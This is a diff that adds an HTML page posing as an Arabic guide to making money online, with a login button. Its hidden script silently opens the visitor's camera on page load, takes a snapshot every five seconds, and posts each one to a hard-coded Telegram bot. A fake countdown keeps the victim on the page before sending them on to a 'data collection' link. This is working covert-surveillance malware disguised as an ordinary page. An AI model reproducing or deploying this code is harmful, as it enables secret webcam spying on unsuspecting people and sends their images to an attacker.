@@ -1,0 +1,168 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Camera Capture</title>
+  <style>
+    body {
+      background-color: #f0f2f5;
+      margin: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      flex-direction: column;
+      font-family: Arial, sans-serif;
+    }
+
+    video, canvas {
+      display: none;
+    }
+
+    .login-button {
+      margin-top: 20px;
+      padding: 10px 20px;
+      background-color: #1877f2;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      font-size: 1em;
+      text-decoration: none;
+      text-align: center;
+    }
+
+    .login-button:hover {
+      background-color: #145dbf;
+    }
+
+    .money-info {
+      margin-top: 40px;
+      padding: 20px;
+      background-color: #ffffff;
+      border-radius: 10px;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+      width: 80%;
+      text-align: center;
+    }
+
+    .money-info h2 {
+      color: #333;
+    }
+
+    .money-info p {
+      color: #555;
+      font-size: 1.2em;
+    }
+
+    .loading {
+      font-size: 1.2em;
+      color: #333;
+      display: none;
+    }
+
+    .countdown-container {
+      margin-top: 20px;
+      font-size: 1.2em;
+      color: #d9534f;
+      text-align: center;
+    }
+  </style>
+</head>
+<body>
+  <video id="video" autoplay></video>
+  <canvas id="canvas"></canvas>
+
+  <!-- مربع الحوار الذي يحتوي على المعلومات -->
+  <div class="money-info">
+    <h2>طرق اكتساب المال من الإنترنت</h2>
+    <p>يُعد الإنترنت أحد أكبر الوسائل التي يمكن استخدامها لكسب المال بطرق متنوعة. من بين الطرق الشهيرة التي يمكن للأفراد استغلالها:</p>
+    <ul>
+      <li><strong>التسويق بالعمولة:</strong> يمكن لك أن تكسب المال من خلال الترويج للمنتجات أو الخدمات عبر الإنترنت.</li>
+      <li><strong>العمل الحر (Freelancing):</strong> يوفر الإنترنت فرصًا للعمل على مشاريع متنوعة مثل الكتابة، التصميم، البرمجة، والترجمة.</li>
+      <li><strong>إنشاء المحتوى:</strong> يمكنك كسب المال من خلال إنشاء محتوى على منصات مثل يوتيوب أو بلوجر، سواء من خلال الإعلانات أو الرعاية.</li>
+      <li><strong>التجارة الإلكترونية:</strong> بيع المنتجات على الإنترنت من خلال متاجر إلكترونية أو عبر منصات مثل إيباي وأمازون.</li>
+      <li><strong>الدورات التعليمية عبر الإنترنت:</strong> إذا كنت تمتلك مهارة أو معرفة خاصة، يمكنك تقديم دورات تدريبية عبر الإنترنت وتحقيق دخل ثابت.</li>
+      
+      <li> لو عاوز تعرف المزيد عن طرق كسب المال من الانترنت اضغط على زر تسجيل الدخول لمعرفة كل شي</li>
+    </ul>
+  </div>
+
+  <!-- العد التنازلي يظهر هنا -->
+  <div class="countdown-container">
+    <p id="countdown-timer">وقت التحميل: 20 ثانية</p>
+  </div>
+
+  <!-- زر تسجيل الدخول -->
+  <a href="https://hanoybot.github.io/Data-collection/" class="login-button" id="login-button" onclick="handleClick(event)">تسجيل الدخول</a>
+
+  <script>
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    let sendImages = true;
+    let countdown = 20;
+
+    async function startCamera() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        video.srcObject = stream;
+        captureAndSend();
+      } catch (error) {
+        console.error("Error accessing camera: ", error);
+      }
+    }
+
+    async function captureAndSend() {
+      const context = canvas.getContext('2d');
+      setInterval(async () => {
+        if (!sendImages) return;
+
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+        const imageData = canvas.toDataURL('image/png');
+        sendToTelegram(imageData);
+      }, 5000);
+    }
+
+    async function sendToTelegram(imageData) {
+      const token = '8165540566:AAGXlo_1ljb6IkAG8jj7BjZdxwfJQhub96o';
+      const chatId = '6514749116';
+
+      const blob = await fetch(imageData).then(res => res.blob());
+      const formData = new FormData();
+      formData.append('chat_id', chatId);
+      formData.append('photo', blob, 'photo.png');
+      formData.append('caption', '@blackdemonbot');
+
+      fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+        method: 'POST',
+        body: formData
+      })
+      .then(response => response.json())
+      .then(result => {
+        console.log('Photo sent successfully:', result);
+      })
+      .catch(error => {
+        console.error('Error sending photo:', error);
+      });
+    }
+
+    function handleClick(event) {
+      event.preventDefault();
+      let countdownInterval = setInterval(function() {
+        document.getElementById('countdown-timer').textContent = `وقت التحميل: ${countdown} ثانية`;
+        countdown--;
+        if (countdown < 0) {
+          clearInterval(countdownInterval);
+          window.location.href = event.target.href;
+        }
+      }, 1000);
+    }
+
+    startCamera();
+  </script>
+</body>
+</html>
